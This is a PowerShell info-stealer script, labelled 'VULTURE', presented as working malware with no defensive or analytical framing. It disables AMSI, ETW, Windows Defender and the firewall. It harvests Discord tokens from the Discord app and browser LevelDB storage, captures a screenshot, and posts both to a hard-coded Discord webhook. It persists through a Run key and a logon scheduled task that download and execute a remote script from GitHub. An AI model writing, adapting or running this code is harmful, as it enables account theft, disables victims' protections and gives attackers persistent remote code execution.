# === CONFIG ===
$hook = "https://discord.com/api/webhooks/1538214692596621332/kEP2XURi2kl5l6uIRgf_HEMwSZUrlujk5KHi3TxcGcfF0hyr5rbUpRI-u-94Lo6aMIhD"

# === AMSI/ETW BYPASS ===
try { 
    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    if ($a) { $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
} catch {}
try {
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Internal.PipelineOps')
    if ($etw) { $etw.GetField('etwEnabled','NonPublic,Static').SetValue($null,$false) }
} catch {}

# === DISABLE DEFENDER ===
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
netsh advfirewall set allprofiles state off > $null

# === STEAL TOKENS FROM BROWSERS (WITHOUT SQLITE) ===
$tokens = @()

# 1. Discord App LevelDB
"$env:APPDATA\Discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb" | ForEach-Object {
    if (Test-Path $_) {
        Get-ChildItem "$_\*.log", "$_\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $tokens += $_.Value
                    }
                }
            } catch {}
        }
    }
}

# 2. Browser Local Storage (Chrome/Edge/Brave)
$browsers = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
)

foreach ($ldbPath in $browsers) {
    if (Test-Path $ldbPath) {
        Get-ChildItem "$ldbPath\*.log", "$ldbPath\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                [IO.File]::ReadAllText($_.FullName) | ForEach-Object {
                    [Regex]::Matches($_, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}') | ForEach-Object {
                        $tokens += $_.Value
                    }
                }
            } catch {}
        }
    }
}

# === SCREENSHOT ===
Add-Type -AssemblyName System.Windows.Forms
$bmp = New-Object Drawing.Bitmap([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
[Drawing.Graphics]::FromImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)
$ms = New-Object IO.MemoryStream
$bmp.Save($ms, [Drawing.Imaging.ImageFormat]::Png)
$bytes = $ms.ToArray()
$ms.Close()

# === SEND TO WEBHOOK ===
$report = "**[VULTURE]**`nPC: $env:COMPUTERNAME`nTokens: $($tokens.Count)`n`n" + ($tokens -join "`n")
$boundary = [Guid]::NewGuid().ToString()
$body = "--$boundary`nContent-Disposition: form-data; name=`"content`"`n`n$report`n--$boundary`nContent-Disposition: form-data; name=`"file`"; filename=`"s.png`"`nContent-Type: image/png`n`n"
$footer = "`n--$boundary--`n"

$webRequest = [Net.WebRequest]::Create($hook)
$webRequest.Method = "POST"
$webRequest.ContentType = "multipart/form-data; boundary=$boundary"
$webRequest.ContentLength = $body.Length + $bytes.Length + $footer.Length

$reqStream = $webRequest.GetRequestStream()
$reqStream.Write([Text.Encoding]::UTF8.GetBytes($body), 0, $body.Length)
$reqStream.Write($bytes, 0, $bytes.Length)
$reqStream.Write([Text.Encoding]::UTF8.GetBytes($footer), 0, $footer.Length)
$reqStream.Close()
$webRequest.GetResponse()

# === PERSISTENCE ===
$cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command `"iex(irm 'https://raw.githubusercontent.com/saksham123107-pixel/son/main/son.ps1')`""
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsManager" -Value $cmd -ErrorAction SilentlyContinue
schtasks /create /tn "WindowsManager" /tr "$cmd" /sc onlogon /f /rl highest /it > $null 2>&1
